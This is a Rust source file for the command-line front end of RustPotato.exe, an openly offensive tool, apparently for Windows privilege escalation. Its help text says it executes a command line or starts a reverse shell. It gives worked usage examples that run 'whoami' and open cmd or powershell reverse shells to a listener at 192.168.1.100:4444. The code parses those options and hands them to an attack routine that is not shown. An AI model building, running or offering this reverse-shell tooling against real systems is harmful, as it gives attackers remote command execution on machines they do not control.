use crate::{_print, run};

pub fn parse_args() {
    let args: Vec<String> = std::env::args().collect();

    if args.len() < 2 {
        _print!(
            "Usage: {} <cmdline> OR -h <host> -p <port> [-c <cmd>]",
            args[0]
        );
        std::process::exit(1);
    }

    if args[1].starts_with("-") {
        let mut host: Option<String> = None;
        let mut port: Option<u16> = None;
        let mut command: Option<String> = None;

        let mut i = 1;
        while i < args.len() {
            match args[i].as_str() {
                "-h" => {
                    if i + 1 < args.len() {
                        host = Some(args[i + 1].clone());
                        i += 1;
                    } else {
                        _print!("[-] Error: Missing value for -h");
                        std::process::exit(1);
                    }
                }
                "-p" => {
                    if i + 1 < args.len() {
                        match args[i + 1].parse::<u16>() {
                            Ok(p) => port = Some(p),
                            Err(_) => {
                                _print!("[-] Error: Invalid port value");
                                std::process::exit(1);
                            }
                        }
                        i += 1;
                    } else {
                        _print!("[-] Error: Missing value for -p");
                        std::process::exit(1);
                    }
                }
                "-c" => {
                    if i + 1 < args.len() {
                        command = Some(args[i + 1].clone());
                        i += 1;
                    } else {
                        _print!("[-] Error: Missing value for -c");
                        std::process::exit(1);
                    }
                }
                "--help" => {
                    _print!(
                        r#"
Usage:
    RustPotato.exe <cmdline> OR -h <host> -p <port> [-c <cmd>]

Description:
    Execute a command line or start a reverse shell.

Options:
    <cmdline>           Execute the specified command line.
    -h <LHOST>         Specify the IP address of the listener.
    -p <LPORT>         Specify the port of the listener.
    -c <cmd|powershell>
                        Specify the shell to be used in the reverse shell (optional, default is cmd).

Examples:
    Execute a command line:
    RustPotato.exe "cmd.exe /c whoami"

    Start a reverse shell with the default shell (cmd):
    RustPotato.exe -h 192.168.1.100 -p 4444

    Start a reverse shell with powershell:
    RustPotato.exe -h 192.168.1.100 -p 4444 -c powershell
                "#
                    );
                    std::process::exit(0);
                }
                _ => {
                    _print!("[-] Error: Unknown option {}", args[i]);
                    std::process::exit(1);
                }
            }
            i += 1;
        }

        if host.is_none() || port.is_none() {
            _print!("[-] Error: Both -h and -p are required.");
            std::process::exit(1);
        }

        run(
            &command.unwrap_or_else(|| "cmd".to_string()),
            Some(host.unwrap().as_str()),
            port,
        );
    } else {
        let input_arg = &args[1];

        if input_arg.is_empty() {
            _print!("[-] Error: The argument cannot be an empty string.");
            std::process::exit(1);
        }

        run(input_arg, None, None);
    }
}
